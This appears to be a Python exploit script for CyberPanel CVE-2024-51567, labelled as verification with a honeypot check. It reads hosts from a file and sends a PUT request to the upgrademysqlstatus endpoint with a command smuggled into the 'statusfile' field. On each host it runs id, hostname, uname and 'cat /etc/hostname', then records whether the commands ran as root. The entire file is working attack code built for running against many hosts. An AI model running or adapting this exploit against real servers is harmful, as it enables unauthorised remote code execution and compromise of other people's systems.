#!/usr/bin/env python3
"""CyberPanel CVE-2024-51567 verification with honeypot control test."""
import sys,json,re,requests,urllib3,time
urllib3.disable_warnings()
UA={"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) Chrome/126 Safari/537.36"}
def rce(host,cmd,scheme="https"):
    base=f"{scheme}://{host}"
    s=requests.Session(); s.verify=False; s.headers.update(UA)
    r=s.get(base+"/",timeout=15,allow_redirects=False)
    m=re.search(r"csrftoken=([A-Za-z0-9]+)",str(r.headers))
    tok=m.group(1) if m else s.cookies.get("csrftoken")
    if not tok:
        s.get(base+"/login/",timeout=15); tok=s.cookies.get("csrftoken")
    if not tok: return None,None
    p={"statusfile":cmd if cmd.startswith("/dev/null") else f"/dev/null; {cmd}; #","csrftoken":tok}
    e=s.put(base+"/dataBases/upgrademysqlstatus",json=p,timeout=15,
            headers={"X-CSRFToken":tok,"Content-Type":"application/json","Referer":base+"/"})
    return e.text,e.status_code
for line in open(sys.argv[1]):
    h=line.strip()
    if not h: continue
    out={"host":h}
    try:
        ctrl,c1=rce(h,"/dev/null")                 # CONTROL: no command
        real,c2=rce(h,"id; hostname; uname -sr; cat /etc/hostname")
        out["control_code"]=c1; out["control_has_uid"]=("uid=" in (ctrl or ""))
        out["real_code"]=c2
        t=real or ""
        m=re.search(r"uid=0\([^)]*\)[^\\\"]{0,80}",t)
        out["id"]=m.group(0) if m else None
        out["hostname"]=re.search(r"[a-zA-Z0-9][a-zA-Z0-9._-]{2,40}",(t or "").split("uid=")[-1]) .group(0) if "uid=" in t else None
        out["VERDICT"]="REAL" if ("uid=" in t and not out["control_has_uid"]) else "HONEYPOT_OR_FAIL"
        out["raw"]=re.sub(r"[^\x20-\x7e]","",t)[:260]
    except Exception as e:
        out["err"]=str(e)[:70]
    print(json.dumps(out),flush=True)
